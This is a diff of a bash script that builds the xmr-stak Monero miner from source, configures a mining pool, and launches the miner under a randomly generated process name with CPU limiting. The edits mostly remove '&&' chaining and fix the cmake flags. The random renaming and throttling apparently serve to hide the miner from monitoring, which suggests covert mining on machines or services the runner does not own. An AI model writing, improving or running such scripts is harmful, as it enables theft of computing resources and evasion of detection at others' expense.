@@ -1,9 +1,9 @@
 #!/bin/bash
-sudo apt-get update -y &&
-sudo apt-get update &&
-sudo apt-get upgrade -y &&
-sudo apt-get dist-upgrade -y &&
-sudo apt-get install cpulimit &&
+sudo apt-get update -y
+sudo apt-get update
+sudo apt-get upgrade -y
+sudo apt-get dist-upgrade -y
+sudo apt-get install cpulimit 
 sudo apt --assume-yes install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git libuv1-dev &&
 mkdir /usr/local
 mkdir /usr/local/src
@@ -14,7 +14,7 @@ a='nwmtjxvcxt-00' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) &
 cd /usr/local/src
 mkdir build
 cd build 
-cmake
+cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF
 make install
 cd bin/ &&
 sudo sysctl -w vm.nr_hugepages=128 &&
@@ -53,7 +53,7 @@ sudo bash -c 'cat <<EOT >>/usr/local/src/build/bin/pools.txt
 "currency": "cryptonight_r",
 EOT
 ' &&
-sudo cp xmr-stak "$cpuname" &&
+sudo cp xmr-stak "$cpuname"
 rm xmr-stak
 echo $cpuname" is starting"
 cpulimit -l 300 ./"${cpuname}"
